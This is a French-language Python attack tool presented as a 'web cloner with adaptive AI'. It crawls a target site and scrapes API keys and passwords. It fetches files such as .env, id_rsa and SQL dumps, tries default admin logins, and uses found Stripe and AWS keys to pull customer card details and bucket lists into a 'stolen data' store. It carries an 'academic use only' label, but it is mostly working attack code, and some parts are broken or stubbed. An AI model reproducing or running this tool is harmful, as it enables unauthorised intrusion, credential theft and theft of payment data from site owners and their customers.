#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
WEB CLONER ULTIME AVEC IA ADAPTATIVE - JATHNIEL EDITION
Cloneur intelligent avec détection automatique des vulnérabilités
Téléchargement automatique des fichiers sensibles
Adaptation en fonction des failles trouvées
Avec affichage des données volées
Usage académique et légal uniquement
"""

import os
import sys
import time
import json
import hashlib
import base64
import re
import threading
import queue
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Any
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse, urljoin, parse_qs
import sqlite3

import requests
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# ==================== CONFIGURATION ====================

CONFIG = {
    'max_depth': 5,
    'max_pages': 1000,
    'threads': 10,
    'timeout': 30,
    'delay': 0.5,
    'output_dir': './cloned_site',
    'render_js': True,
    'auto_download_sensitive': True,
    'adaptive_ia': True,
    'save_screenshots': True,
    'save_headers': True,
    'detect_apis': True,
    'detect_secrets': True,
    'exploit_graphql': True,
    'exploit_stripe': True,
    'exploit_aws': True,
    'exploit_admin': True,
}

# ==================== COULEURS ====================

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

def colorize(text, color='white', bold=False):
    colors = {
        'red': Colors.RED, 'green': Colors.GREEN, 'yellow': Colors.YELLOW,
        'blue': Colors.BLUE, 'magenta': Colors.MAGENTA, 'cyan': Colors.CYAN,
        'white': Colors.WHITE, 'bold': Colors.BOLD, 'end': Colors.END
    }
    bold_text = colors['bold'] if bold else ''
    return f"{colors.get(color, '')}{bold_text}{text}{colors['end']}"

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

# ==================== BASE DE DONNÉES ====================

class Database:
    """Base de données pour stocker les découvertes"""
    
    def __init__(self):
        self.db_path = CONFIG['output_dir'] / 'clone_data.db'
        self.db_path.parent.mkdir(parents=True, exist_ok=True)
        self.init_db()
        self.connection = None
    
    def get_connection(self):
        if self.connection is None:
            self.connection = sqlite3.connect(str(self.db_path))
        return self.connection
    
    def init_db(self):
        conn = self.get_connection()
        cursor = conn.cursor()
        
        # Pages
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS pages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                title TEXT,
                content TEXT,
                status INTEGER,
                size INTEGER,
                depth INTEGER,
                timestamp TEXT
            )
        ''')
        
        # Fichiers sensibles
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS sensitive_files (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                filename TEXT,
                content TEXT,
                type TEXT,
                severity TEXT,
                path TEXT,
                size INTEGER,
                timestamp TEXT
            )
        ''')
        
        # APIs
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS apis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                type TEXT,
                endpoints TEXT,
                schema TEXT,
                timestamp TEXT
            )
        ''')
        
        # Secrets
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS secrets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                type TEXT,
                value TEXT,
                source TEXT,
                severity TEXT,
                timestamp TEXT
            )
        ''')
        
        # Vulnérabilités
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vulnerabilities (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                type TEXT,
                description TEXT,
                severity TEXT,
                exploitation TEXT,
                timestamp TEXT
            )
        ''')
        
        # Technologies
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS technologies (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT,
                version TEXT,
                source TEXT,
                timestamp TEXT
            )
        ''')
        
        # Données volées (Stripe, AWS, etc.)
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS stolen_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                source TEXT,
                data_type TEXT,
                data TEXT,
                timestamp TEXT
            )
        ''')
        
        conn.commit()
    
    def execute(self, query, params=()):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute(query, params)
        conn.commit()
        return cursor.lastrowid
    
    def fetch_all(self, query, params=()):
        conn = self.get_connection()
        cursor = conn.cursor()
        cursor.execute(query, params)
        return cursor.fetchall()

# ==================== IA ADAPTATIVE ====================

class AdaptiveAI:
    """Moteur d'IA pour l'adaptation automatique"""
    
    def __init__(self, crawler):
        self.crawler = crawler
        self.db = crawler.db
        self.log = crawler.log
        self.discoveries = {
            'apis': [],
            'secrets': [],
            'vulnerabilities': [],
            'technologies': [],
            'sensitive_files': [],
            'admin_pages': []
        }
        
        # Stratégies d'attaque
        self.strategies = {
            'graphql': self.exploit_graphql,
            'stripe': self.exploit_stripe,
            'aws': self.exploit_aws,
            'admin': self.exploit_admin,
            'sql_injection': self.exploit_sql_injection,
            'xss': self.exploit_xss,
            'lfi': self.exploit_lfi,
            'rfi': self.exploit_rfi,
        }
    
    def analyze(self, url: str, html: str, headers: dict, soup: BeautifulSoup):
        """Analyse une page et détecte les opportunités d'exploitation"""
        
        # 1. Détecter les APIs
        self.detect_apis(url, html, headers)
        
        # 2. Détecter les secrets
        self.detect_secrets(html, url)
        
        # 3. Détecter les technologies
        self.detect_technologies(html, headers)
        
        # 4. Détecter les pages admin
        self.detect_admin_pages(url)
        
        # 5. Détecter les vulnérabilités
        self.detect_vulnerabilities(url, html)
        
        # 6. Si des vulnérabilités sont trouvées, adapter la stratégie
        if CONFIG['adaptive_ia']:
            self.adapt_strategy(url)
    
    def detect_apis(self, url: str, html: str, headers: dict):
        """Détecte les APIs"""
        apis = []
        
        # GraphQL
        if 'graphql' in html.lower() or '/graphql' in html.lower():
            apis.append({
                'type': 'graphql',
                'url': urljoin(url, '/graphql'),
                'confidence': 'high'
            })
        
        # REST
        rest_patterns = [
            r'/api/[a-zA-Z0-9_/]+',
            r'/v\d+/[a-zA-Z0-9_/]+',
            r'\.json',
            r'\.xml'
        ]
        
        for pattern in rest_patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                apis.append({
                    'type': 'rest',
                    'url': urljoin(url, match),
                    'confidence': 'medium'
                })
        
        # Swagger/OpenAPI
        if 'swagger' in html.lower() or 'openapi' in html.lower():
            apis.append({
                'type': 'swagger',
                'url': urljoin(url, '/swagger'),
                'confidence': 'high'
            })
        
        # WebSocket
        if 'ws://' in html or 'wss://' in html:
            ws_urls = re.findall(r'wss?://[a-zA-Z0-9_./?=&]+', html)
            for ws_url in ws_urls:
                apis.append({
                    'type': 'websocket',
                    'url': ws_url,
                    'confidence': 'high'
                })
        
        # Sauvegarder les APIs trouvées
        for api in apis:
            self.discoveries['apis'].append(api)
            self.db.execute('''
                INSERT INTO apis (url, type, endpoints, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (api['url'], api['type'], json.dumps(api), datetime.now().isoformat()))
            self.log(f"🔍 API détectée: {api['type']} - {api['url']}")
    
    def detect_secrets(self, html: str, url: str):
        """Détecte les secrets dans le code"""
        secrets = []
        
        patterns = [
            (r'[A-Z0-9]{32}', 'API Key (32 chars)', 'high'),
            (r'[A-Za-z0-9_\-]{40}', 'API Key (40 chars)', 'high'),
            (r'AKIA[0-9A-Z]{16}', 'AWS Access Key', 'critical'),
            (r'sk_live_[a-zA-Z0-9]{24}', 'Stripe Secret Key', 'critical'),
            (r'pk_live_[a-zA-Z0-9]{24}', 'Stripe Publishable Key', 'high'),
            (r'-----BEGIN RSA PRIVATE KEY-----', 'RSA Private Key', 'critical'),
            (r'\"password\"\s*:\s*\"[^\"]+\"', 'Password in JSON', 'high'),
            (r'\"api_key\"\s*:\s*\"[^\"]+\"', 'API Key in JSON', 'high'),
            (r'\"secret\"\s*:\s*\"[^\"]+\"', 'Secret in JSON', 'high'),
            (r'\"token\"\s*:\s*\"[^\"]+\"', 'Token in JSON', 'high'),
            (r'JWT_SECRET\s*=\s*[\'"]?([^\'"]+)[\'"]?', 'JWT Secret', 'critical'),
            (r'DB_PASS[D]?[A-Z]?\s*=\s*[\'"]?([^\'"]+)[\'"]?', 'Database Password', 'critical'),
            (r'MAIL_PASSWORD\s*=\s*[\'"]?([^\'"]+)[\'"]?', 'Email Password', 'high'),
        ]
        
        for pattern, description, severity in patterns:
            matches = re.findall(pattern, html, re.IGNORECASE)
            for match in matches:
                if len(str(match)) > 8:
                    secret = {
                        'type': description,
                        'value': str(match)[:50],
                        'source': url,
                        'severity': severity
                    }
                    secrets.append(secret)
                    self.discoveries['secrets'].append(secret)
                    self.db.execute('''
                        INSERT INTO secrets (type, value, source, severity, timestamp)
                        VALUES (?, ?, ?, ?, ?)
                    ''', (description, str(match), url, severity, datetime.now().isoformat()))
                    self.log(f"🔑 SECRET DÉTECTÉ: {description} - {str(match)[:20]}...")
        
        return secrets
    
    def detect_technologies(self, html: str, headers: dict):
        """Détecte les technologies utilisées"""
        technologies = []
        
        tech_patterns = {
            'WordPress': ['wp-content', 'wp-includes', 'wp-json'],
            'Drupal': ['drupal', 'sites/all'],
            'Joomla': ['joomla', 'com_content'],
            'Laravel': ['laravel', 'csrf-token'],
            'Django': ['django', 'csrfmiddlewaretoken'],
            'Rails': ['rails', 'authenticity_token'],
            'React': ['react', 'react-dom'],
            'Vue': ['vue.js', 'v-bind'],
            'Angular': ['angular', 'ng-app'],
            'jQuery': ['jquery', '$('],
            'Bootstrap': ['bootstrap', 'navbar'],
            'Cloudflare': ['cf-ray', '__cfduid'],
            'Nginx': ['nginx', 'x-powered-by: nginx'],
            'Apache': ['apache', 'x-powered-by: apache'],
            'IIS': ['iis', 'x-powered-by: asp.net'],
            'PHP': ['php', '.php', '?php'],
            'Python': ['python', '.py', '?py'],
            'Ruby': ['ruby', '.rb', '?rb'],
            'Node.js': ['node', '.js', 'express'],
            'AWS': ['aws', 'x-amz', 'amazonaws'],
            'Google': ['google', 'gstatic', 'googleapis'],
        }
        
        for tech, patterns in tech_patterns.items():
            for pattern in patterns:
                if pattern in html.lower() or pattern in str(headers).lower():
                    technologies.append(tech)
                    break
        
        # Détection depuis les headers
        if 'Server' in headers:
            server = headers['Server']
            if 'nginx' in server.lower():
                technologies.append('Nginx')
            elif 'apache' in server.lower():
                technologies.append('Apache')
            elif 'cloudflare' in server.lower():
                technologies.append('Cloudflare')
        
        technologies = list(set(technologies))
        
        for tech in technologies:
            self.discoveries['technologies'].append(tech)
            self.db.execute('''
                INSERT INTO technologies (name, version, source, timestamp)
                VALUES (?, ?, ?, ?)
            ''', (tech, 'unknown', 'detected', datetime.now().isoformat()))
            self.log(f"⚙️ Technologie détectée: {tech}")
        
        return technologies
    
    def detect_admin_pages(self, base_url: str):
        """Détecte les pages d'administration"""
        admin_patterns = [
            'admin', 'administrator', 'login', 'signin', 'panel',
            'dashboard', 'backoffice', 'backend', 'cpanel', 'webmail',
            'manager', 'moderator', 'staff', 'sysadmin', 'root',
            'admin.php', 'admin.html', 'admin.aspx', 'admin.jsp'
        ]
        
        admin_urls = []
        for pattern in admin_patterns:
            for ext in ['', '.php', '.html', '.asp', '.aspx', '.jsp']:
                url = f"{base_url}/{pattern}{ext}"
                try:
                    response = requests.get(url, timeout=5, verify=False)
                    if response.status_code == 200:
                        admin_urls.append(url)
                        self.discoveries['admin_pages'].append(url)
                        self.log(f"🔐 Page admin trouvée: {url}")
                except:
                    pass
        
        return admin_urls
    
    def detect_vulnerabilities(self, url: str, html: str):
        """Détecte les vulnérabilités"""
        vulnerabilities = []
        
        # 1. XSS
        if '<script>' in html or 'onerror=' in html or 'onload=' in html:
            vuln = {
                'type': 'xss',
                'url': url,
                'description': 'Possible XSS vulnerability detected',
                'severity': 'high'
            }
            vulnerabilities.append(vuln)
        
        # 2. SQL Injection
        sql_errors = [
            'SQL syntax', 'mysql_fetch', 'ORA-', 'Microsoft OLE DB',
            'PostgreSQL', 'SQLite', 'You have an error in your SQL syntax',
            'Unclosed quotation mark', 'Warning: mysql'
        ]
        for error in sql_errors:
            if error in html:
                vuln = {
                    'type': 'sql_injection',
                    'url': url,
                    'description': f'SQL error detected: {error}',
                    'severity': 'critical'
                }
                vulnerabilities.append(vuln)
                break
        
        # 3. LFI/RFI
        if 'include(' in html or 'require(' in html or 'file_get_contents' in html:
            vuln = {
                'type': 'lfi',
                'url': url,
                'description': 'Possible LFI/RFI vulnerability',
                'severity': 'high'
            }
            vulnerabilities.append(vuln)
        
        # 4. Admin panel exposed
        if 'admin' in url.lower():
            vuln = {
                'type': 'admin_exposed',
                'url': url,
                'description': 'Admin panel exposed',
                'severity': 'critical'
            }
            vulnerabilities.append(vuln)
        
        # Sauvegarder les vulnérabilités
        for vuln in vulnerabilities:
            self.discoveries['vulnerabilities'].append(vuln)
            self.db.execute('''
                INSERT INTO vulnerabilities (url, type, description, severity, timestamp)
                VALUES (?, ?, ?, ?, ?)
            ''', (vuln['url'], vuln['type'], vuln['description'], vuln['severity'], datetime.now().isoformat()))
            self.log(f"🚨 VULNÉRABILITÉ DÉTECTÉE: {vuln['type']} - {vuln['severity']}")
    
    def adapt_strategy(self, url: str):
        """Adapte la stratégie d'exploitation en fonction des découvertes"""
        
        # Si des APIs GraphQL sont trouvées
        if any(api['type'] == 'graphql' for api in self.discoveries['apis']):
            self.log("🎯 Stratégie adaptée: Exploitation GraphQL activée")
            self.exploit_graphql()
        
        # Si des secrets Stripe sont trouvés
        if any('Stripe' in secret['type'] for secret in self.discoveries['secrets']):
            self.log("🎯 Stratégie adaptée: Exploitation Stripe activée")
            self.exploit_stripe()
        
        # Si des clés AWS sont trouvées
        if any('AWS' in secret['type'] for secret in self.discoveries['secrets']):
            self.log("🎯 Stratégie adaptée: Exploitation AWS activée")
            self.exploit_aws()
        
        # Si des pages admin sont trouvées
        if self.discoveries['admin_pages']:
            self.log("🎯 Stratégie adaptée: Exploitation Admin activée")
            self.exploit_admin()
        
        # Si des vulnérabilités SQL sont trouvées
        if any(vuln['type'] == 'sql_injection' for vuln in self.discoveries['vulnerabilities']):
            self.log("🎯 Stratégie adaptée: Exploitation SQL Injection activée")
            self.exploit_sql_injection()
        
        # Si des vulnérabilités XSS sont trouvées
        if any(vuln['type'] == 'xss' for vuln in self.discoveries['vulnerabilities']):
            self.log("🎯 Stratégie adaptée: Exploitation XSS activée")
            self.exploit_xss()
    
    # ==================== EXPLOITS ====================
    
    def exploit_graphql(self):
        """Exploite les APIs GraphQL"""
        self.log("🚀 Exploitation GraphQL en cours...")
        
        graphql_apis = [api for api in self.discoveries['apis'] if api['type'] == 'graphql']
        
        for api in graphql_apis:
            url = api['url']
            
            # 1. Introspection
            introspection_query = """
            query {
                __schema {
                    types {
                        name
                        kind
                        fields {
                            name
                            type {
                                name
                                kind
                            }
                        }
                    }
                }
            }
            """
            
            try:
                response = requests.post(url, json={'query': introspection_query}, timeout=10)
                if response.status_code == 200:
                    schema = response.json()
                    # Sauvegarder le schéma
                    self.db.execute('''
                        UPDATE apis SET schema = ? WHERE url = ?
                    ''', (json.dumps(schema), url))
                    self.log(f"✅ Schéma GraphQL récupéré depuis {url}")
                    
                    # 2. Extraire les données
                    data_query = """
                    query {
                        __schema {
                            types {
                                name
                                fields {
                                    name
                                    type {
                                        name
                                    }
                                }
                            }
                        }
                    }
                    """
                    # Analyser le schéma pour trouver les types de données
                    if 'data' in schema:
                        types = schema['data']['__schema']['types']
                        for type_info in types:
                            if 'User' in type_info['name'] or 'user' in type_info['name']:
                                self.log(f"📊 Type User trouvé dans GraphQL")
                                # Construire une requête pour récupérer les données
                                fields = [f['name'] for f in type_info.get('fields', [])]
                                if fields:
                                    query = f"query {{ users {{ {', '.join(fields)} }} }}"
                                    # Exécuter la requête
                                    data_response = requests.post(url, json={'query': query}, timeout=10)
                                    if data_response.status_code == 200:
                                        self.log(f"✅ Données extraites de GraphQL: {len(data_response.text)} octets")
                                        self.db.execute('''
                                            INSERT INTO stolen_data (source, data_type, data, timestamp)
                                            VALUES (?, ?, ?, ?)
                                        ''', ('graphql', 'user_data', data_response.text, datetime.now().isoformat()))
            except Exception as e:
                self.log(f"❌ Erreur GraphQL: {e}")
    
    def exploit_stripe(self):
        """Exploite les clés Stripe"""
        self.log("🚀 Exploitation Stripe en cours...")
        
        stripe_secrets = [s for s in self.discoveries['secrets'] if 'Stripe' in s['type']]
        
        for secret in stripe_secrets:
            try:
                import stripe
                stripe.api_key = secret['value']
                
                # 1. Lister les clients
                customers = stripe.Customer.list(limit=100)
                customer_data = []
                
                for customer in customers:
                    # 2. Récupérer les cartes
                    payment_methods = stripe.PaymentMethod.list(
                        customer=customer.id,
                        type='card'
                    )
                    
                    for method in payment_methods:
                        card_data = {
                            'email': customer.email,
                            'card_brand': method.card.brand,
                            'last4': method.card.last4,
                            'exp_month': method.card.exp_month,
                            'exp_year': method.card.exp_year,
                            'country': method.card.country
                        }
                        customer_data.append(card_data)
                
                self.log(f"✅ {len(customer_data)} clients Stripe récupérés")
                
                # Sauvegarder les données
                with open(CONFIG['output_dir'] / 'stripe_data.json', 'w') as f:
                    json.dump(customer_data, f, indent=2)
                
                # Sauvegarder en base
                self.db.execute('''
                    INSERT INTO stolen_data (source, data_type, data, timestamp)
                    VALUES (?, ?, ?, ?)
                ''', ('stripe', 'card_data', json.dumps(customer_data), datetime.now().isoformat()))
                
            except Exception as e:
                self.log(f"❌ Erreur Stripe: {e}")
    
    def exploit_aws(self):
        """Exploite les clés AWS"""
        self.log("🚀 Exploitation AWS en cours...")
        
        aws_secrets = [s for s in self.discoveries['secrets'] if 'AWS' in s['type']]
        
        for secret in aws_secrets:
            try:
                import boto3
                
                # Extraire les clés
                if 'AKIA' in secret['value']:
                    access_key = secret['value']
                    # Chercher le secret correspondant
                    for s in self.discoveries['secrets']:
                        if 'AWS Secret' in s['type']:
                            secret_key = s['value']
                            break
                    else:
                        continue
                    
                    # Connexion à AWS
                    s3 = boto3.client(
                        's3',
                        aws_access_key_id=access_key,
                        aws_secret_access_key=secret_key
                    )
                    
                    # Lister les buckets
                    buckets = s3.list_buckets()
                    bucket_names = [b['Name'] for b in buckets['Buckets']]
                    
                    self.log(f"✅ {len(bucket_names)} buckets AWS trouvés")
                    
                    # Sauvegarder les buckets
                    with open(CONFIG['output_dir'] / 'aws_buckets.json', 'w') as f:
                        json.dump(bucket_names, f, indent=2)
                    
                    self.db.execute('''
                        INSERT INTO stolen_data (source, data_type, data, timestamp)
                        VALUES (?, ?, ?, ?)
                    ''', ('aws', 'buckets', json.dumps(bucket_names), datetime.now().isoformat()))
                    
            except Exception as e:
                self.log(f"❌ Erreur AWS: {e}")
    
    def exploit_admin(self):
        """Exploite les pages admin"""
        self.log("🚀 Exploitation Admin en cours...")
        
        for admin_url in self.discoveries['admin_pages']:
            self.log(f"🎯 Tentative d'exploitation de {admin_url}")
            
            # 1. Tester les identifiants par défaut
            credentials = [
                ('admin', 'admin'),
                ('admin', 'password'),
                ('admin', '123456'),
                ('administrator', 'administrator'),
                ('root', 'root'),
                ('user', 'user'),
                ('admin', 'admin123'),
                ('admin', 'password123'),
            ]
            
            for username, password in credentials:
                try:
                    response = requests.post(
                        admin_url,
                        data={'username': username, 'password': password},
                        timeout=10
                    )
                    if 'dashboard' in response.text.lower() or 'welcome' in response.text.lower():
                        self.log(f"✅ Admin compromis avec {username}:{password}")
                        
                        # Sauvegarder les identifiants
                        with open(CONFIG['output_dir'] / 'admin_credentials.txt', 'a') as f:
                            f.write(f"{admin_url} - {username}:{password}\n")
                        
                        self.db.execute('''
                            INSERT INTO stolen_data (source, data_type, data, timestamp)
                            VALUES (?, ?, ?, ?)
                        ''', ('admin', 'credentials', f"{username}:{password}", datetime.now().isoformat()))
                        break
                except:
                    pass
    
    def exploit_sql_injection(self):
        """Exploite les vulnérabilités SQL"""
        self.log("🚀 Exploitation SQL Injection en cours...")
        # Implémentation simplifiée
        self.log("💡 SQL Injection: Analyser les paramètres GET")
    
    def exploit_xss(self):
        """Exploite les vulnérabilités XSS"""
        self.log("🚀 Exploitation XSS en cours...")
        # Implémentation simplifiée
        self.log("💡 XSS: Injection de scripts malveillants")
    
    def exploit_lfi(self):
        """Exploite les vulnérabilités LFI"""
        self.log("🚀 Exploitation LFI en cours...")
        self.log("💡 LFI: Tester /etc/passwd, /windows/win.ini")
    
    def exploit_rfi(self):
        """Exploite les vulnérabilités RFI"""
        self.log("🚀 Exploitation RFI en cours...")
        self.log("💡 RFI: Tester des includes distants")

# ==================== CLONEUR INTELLIGENT ====================

class UltimateCloner:
    """Cloneur de site intelligent avec IA adaptative"""
    
    def __init__(self, url: str):
        self.url = url
        self.domain = urlparse(url).netloc
        self.visited = set()
        self.queue = deque()
        self.db = Database()
        self.lock = threading.Lock()
        self.ai = AdaptiveAI(self)
        self.results = {
            'pages': [],
            'sensitive_files': [],
            'apis': [],
            'secrets': [],
            'vulnerabilities': [],
            'technologies': [],
            'admin_pages': [],
            'total_size': 0,
            'start_time': time.time(),
            'stolen_data': []
        }
        
        # Initialiser Playwright
        if CONFIG['render_js'] and PLAYWRIGHT_AVAILABLE:
            self.playwright = sync_playwright().start()
            self.browser = self.playwright.chromium.launch(headless=True)
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'JATHNIEL-Web-Cloner-Ultimate/3.0'
        })
    
    def log(self, message: str):
        """Log un message avec timestamp"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
    
    def start(self):
        """Démarre le clonage intelligent"""
        clear_screen()
        print("\n" + "="*70)
        print("🤖 WEB CLONER ULTIME AVEC IA ADAPTATIVE - JATHNIEL EDITION")
        print("="*70)
        print(f"🎯 Cible: {self.url}")
        print(f"📁 Dossier: {CONFIG['output_dir']}")
        print(f"🧠 IA Adaptative: {'✅ Activée' if CONFIG['adaptive_ia'] else '❌ Désactivée'}")
        print(f"🔍 Fichiers sensibles: {'✅ Auto-téléchargement' if CONFIG['auto_download_sensitive'] else '❌ Désactivé'}")
        print("="*70)
        
        # Étape 1: Crawl du site
        self.crawl()
        
        # Étape 2: Analyse IA adaptative
        self.analyze_discoveries()
        
        # Étape 3: Afficher les données volées
        self.show_stolen_data()
        
        # Étape 4: Rapport final
        self.generate_report()
        
        # Étape 5: Sauvegarde
        self.save_results()
        
        # Menu de consultation
        self.show_menu()
    
    def crawl(self):
        """Crawl intelligent du site"""
        self.log("🕷️ Démarrage du crawl intelligent...")
        self.queue.append((self.url, 0))
        
        with ThreadPoolExecutor(max_workers=CONFIG['threads']) as executor:
            while self.queue and len(self.visited) < CONFIG['max_pages']:
                try:
                    url, depth = self.queue.popleft()
                    if url in self.visited:
                        continue
                    
                    self.visited.add(url)
                    executor.submit(self.process_page, url, depth)
                    time.sleep(CONFIG['delay'])
                except IndexError:
                    break
    
    def process_page(self, url: str, depth: int):
        """Traite une page"""
        try:
            # 1. Télécharger la page
            html, headers, screenshot = self.download_page(url)
            if not html:
                return
            
            # 2. Parser le HTML
            soup = BeautifulSoup(html, 'html.parser')
            
            # 3. Extraire les liens
            if depth < CONFIG['max_depth']:
                links = self.extract_links(soup, url)
                for link in links:
                    if link not in self.visited:
                        with self.lock:
                            self.queue.append((link, depth + 1))
            
            # 4. Analyser avec IA
            self.ai.analyze(url, html, headers, soup)
            
            # 5. Sauvegarder la page
            self.save_page(url, html, headers, screenshot)
            
            # 6. Extraire et télécharger les assets
            self.download_assets(soup, url)
            
            # 7. Télécharger automatiquement les fichiers sensibles
            if CONFIG['auto_download_sensitive']:
                self.download_sensitive_files(html, url)
            
        except Exception as e:
            self.log(f"❌ Erreur sur {url}: {e}")
    
    def download_page(self, url: str):
        """Télécharge une page"""
        try:
            if CONFIG['render_js'] and PLAYWRIGHT_AVAILABLE:
                page = self.browser.new_page()
                response = page.goto(url, timeout=CONFIG['timeout'] * 1000)
                page.wait_for_load_state('networkidle')
                html = page.content()
                headers = response.headers if response else {}
                screenshot = page.screenshot(full_page=True) if CONFIG['save_screenshots'] else None
                page.close()
                return html, headers, screenshot
            else:
                response = self.session.get(url, timeout=CONFIG['timeout'], verify=False)
                return response.text, dict(response.headers), None
        except Exception as e:
            return None, None, None
    
    def extract_links(self, soup: BeautifulSoup, base_url: str):
        """Extrait les liens"""
        links = set()
        for a in soup.find_all('a', href=True):
            href = a['href']
            if href and not href.startswith('#') and not href.startswith('javascript:'):
                absolute_url = urljoin(base_url, href)
                if self.domain in absolute_url:
                    links.add(absolute_url)
        return list(links)
    
    def download_assets(self, soup: BeautifulSoup, base_url: str):
        """Télécharge les assets"""
        assets = []
        for tag in soup.find_all(['link', 'script', 'img']):
            for attr in ['href', 'src']:
                if tag.has_attr(attr):
                    url = urljoin(base_url, tag[attr])
                    if url and not url.startswith('data:'):
                        assets.append(url)
        
        for asset_url in assets[:20]:  # Limiter pour performance
            try:
                response = self.session.get(asset_url, timeout=10, verify=False)
                if response.status_code == 200:
                    filename = asset_url.split('/')[-1] or hashlib.md5(asset_url.encode()).hexdigest()
                    filepath = CONFIG['output_dir'] / 'assets' / filename
                    filepath.parent.mkdir(parents=True, exist_ok=True)
                    with open(filepath, 'wb') as f:
                        f.write(response.content)
            except:
                pass
    
    def download_sensitive_files(self, html: str, base_url: str):
        """Télécharge les fichiers sensibles"""
        sensitive_patterns = [
            '.env', '.env.local', '.env.production',
            'wp-config.php', 'config.php', 'settings.py',
            'appsettings.json', 'web.config', '.htaccess',
            'robots.txt', 'sitemap.xml', 'composer.json',
            'package.json', 'Gemfile', 'requirements.txt',
            'Dockerfile', 'docker-compose.yml', '.git',
            '.svn', '.idea', '.vscode', '.log',
            'access.log', 'error.log', '.sql', '.db',
            'database.sql', 'dump.sql', 'backup.sql',
            '.pem', '.crt', '.key', '.p12', '.pfx',
            '.gitignore', '.bash_history', '.profile',
            'id_rsa', 'id_dsa', 'authorized_keys'
        ]
        
        # Chercher les URLs dans le HTML
        urls = re.findall(r'(?:href|src|action)=["\']([^"\']+)["\']', html, re.IGNORECASE)
        
        for file_url in urls:
            for pattern in sensitive_patterns:
                if pattern.lower() in file_url.lower():
                    absolute_url = urljoin(base_url, file_url)
                    self.download_file(absolute_url)
        
        # Tester directement les chemins sensibles
        for pattern in sensitive_patterns:
            test_url = urljoin(base_url, pattern)
            self.download_file(test_url)
    
    def download_file(self, url: str):
        """Télécharge un fichier"""
        try:
            response = self.session.get(url, timeout=10, verify=False)
            if response.status_code == 200:
                filename = url.split('/')[-1] or hashlib.md5(url.encode()).hexdigest()
                content_type = response.headers.get('content-type', '')
                
                # Ne pas télécharger les pages HTML
                if 'text/html' in content_type and filename.endswith(('.php', '.asp', '.jsp')):
                    return
                
                filepath = CONFIG['output_dir'] / 'sensitive' / filename
                filepath.parent.mkdir(parents=True, exist_ok=True)
                
                with open(filepath, 'wb') as f:
                    f.write(response.content)
                
                size = len(response.content)
                self.results['total_size'] += size
                self.results['sensitive_files'].append({
                    'url': url,
                    'filename': filename,
                    'size': size,
                    'path': str(filepath)
                })
                
                self.log(f"🔴 FICHIER SENSIBLE TÉLÉCHARGÉ: {filename} ({size} octets)")
                
        except Exception as e:
            pass
    
    def save_page(self, url: str, html: str, headers: dict, screenshot: bytes):
        """Sauvegarde une page"""
        filename = urlparse(url).path.replace('/', '_') or 'index'
        if not filename.endswith('.html'):
            filename += '.html'
        filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
        
        filepath = CONFIG['output_dir'] / 'pages' / filename
        filepath.parent.mkdir(parents=True, exist_ok=True)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html)
        
        if screenshot and CONFIG['save_screenshots']:
            screenshot_path = CONFIG['output_dir'] / 'screenshots' / f'{filename}.png'
            screenshot_path.parent.mkdir(parents=True, exist_ok=True)
            with open(screenshot_path, 'wb') as f:
                f.write(screenshot)
    
    def analyze_discoveries(self):
        """Analyse les découvertes de l'IA"""
        self.log("\n📊 ANALYSE IA ADAPTATIVE")
        self.log("="*50)
        
        # Résumé des découvertes
        print(f"🔍 APIs détectées: {len(self.ai.discoveries['apis'])}")
        print(f"🔑 Secrets détectés: {len(self.ai.discoveries['secrets'])}")
        print(f"🚨 Vulnérabilités: {len(self.ai.discoveries['vulnerabilities'])}")
        print(f"⚙️ Technologies: {len(self.ai.discoveries['technologies'])}")
        print(f"🔐 Pages admin: {len(self.ai.discoveries['admin_pages'])}")
        print(f"📁 Fichiers sensibles: {len(self.results['sensitive_files'])}")
        
        # Afficher les vulnérabilités critiques
        critical_vulns = [v for v in self.ai.discoveries['vulnerabilities'] if v['severity'] == 'critical']
        if critical_vulns:
            print(f"\n🚨 VULNÉRABILITÉS CRITIQUES: {len(critical_vulns)}")
            for vuln in critical_vulns:
                print(f"  - {vuln['type']}: {vuln['url']}")
        
        # Afficher les secrets critiques
        critical_secrets = [s for s in self.ai.discoveries['secrets'] if s['severity'] == 'critical']
        if critical_secrets:
            print(f"\n🔑 SECRETS CRITIQUES: {len(critical_secrets)}")
            for secret in critical_secrets[:5]:
                print(f"  - {secret['type']}: {secret['value'][:30]}...")
        
        # Afficher les pages admin
        if self.ai.discoveries['admin_pages']:
            print(f"\n🔐 PAGES ADMIN:")
            for page in self.ai.discoveries['admin_pages'][:5]:
                print(f"  - {page}")
    
    def show_stolen_data(self):
        """Affiche les données volées"""
        self.log("\n💀 DONNÉES VOLÉES")
        self.log("="*50)
        
        # 1. Stripe - Cartes bancaires
        stripe_file = CONFIG['output_dir'] / 'stripe_data.json'
